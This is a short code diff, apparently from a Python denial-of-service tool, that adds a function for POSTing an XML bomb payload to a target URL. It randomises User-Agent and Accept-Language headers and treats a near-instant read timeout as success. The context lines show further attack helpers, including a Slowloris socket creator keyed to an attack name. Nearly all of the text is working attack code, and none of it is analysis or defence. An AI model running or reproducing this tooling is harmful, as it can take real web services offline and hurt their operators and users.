@@ -22,6 +22,22 @@ def post_file_upload(dst_url, filename, payload_bytes, user_agents, accept_lang,
         return False
 
 
+def post_xml_bomb(dst_url, payload_bytes, user_agents, accept_lang, content_type="application/xml"):
+    try:
+        headers = {
+            "User-Agent": choice(user_agents),
+            "Accept-Language": choice(accept_lang),
+            "Content-Type": content_type,
+            "Connection": "close",
+        }
+        post(dst_url, data=payload_bytes, headers=headers, timeout=(3, 0.1))
+        return True
+    except ReadTimeout:
+        return True          
+    except RequestException:
+        return False
+
+
 def create_slowloris_socket(ip, port, user_agents, accept_lang, attackname):
     """Create new socket with random ua and lang and return it back to sockets_list."""
     sock = create_socket(attackname)
